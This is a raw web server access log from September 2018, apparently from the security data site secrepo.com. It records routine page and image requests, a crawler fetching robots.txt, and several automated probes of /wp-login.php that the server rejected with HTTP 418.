131.247.168.248 - - [27/Sep/2018:06:46:57 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
131.247.168.248 - - [27/Sep/2018:06:46:58 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
109.238.48.146 - - [27/Sep/2018:06:53:41 -0700] "GET / HTTP/1.1" 200 12327 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
109.238.48.146 - - [27/Sep/2018:06:53:41 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 284 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
109.238.48.146 - - [27/Sep/2018:06:53:41 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 284 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
109.238.48.146 - - [27/Sep/2018:06:53:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
109.238.48.146 - - [27/Sep/2018:06:53:42 -0700] "GET / HTTP/1.1" 200 12327 "-" "\"Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1\"" 
109.238.48.146 - - [27/Sep/2018:06:53:42 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 284 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
109.238.48.146 - - [27/Sep/2018:06:53:42 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 284 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
109.238.48.146 - - [27/Sep/2018:06:53:42 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 534 "-" "Safari/13605.3.8 CFNetwork/902.1 Darwin/17.7.0 (x86_64)" 
54.36.150.82 - - [27/Sep/2018:06:57:12 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)" 
103.49.252.51 - - [27/Sep/2018:07:01:27 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
103.49.252.51 - - [27/Sep/2018:07:01:27 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
85.163.24.30 - - [27/Sep/2018:07:05:59 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
85.163.24.30 - - [27/Sep/2018:07:05:59 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
181.196.72.15 - - [27/Sep/2018:07:07:07 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
177.37.234.76 - - [27/Sep/2018:07:07:31 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
1.22.49.214 - - [27/Sep/2018:07:08:35 -0700] "GET / HTTP/1.1" 200 12383 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
1.22.49.214 - - [27/Sep/2018:07:08:36 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
1.22.49.214 - - [27/Sep/2018:07:08:36 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" 
103.53.32.139 - - [27/Sep/2018:07:09:00 -0700] "GET / HTTP/1.1" 200 12383 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.53.32.139 - - [27/Sep/2018:07:09:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
103.53.32.139 - - [27/Sep/2018:07:09:02 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36" 
113.171.224.176 - - [27/Sep/2018:07:15:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 46720 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
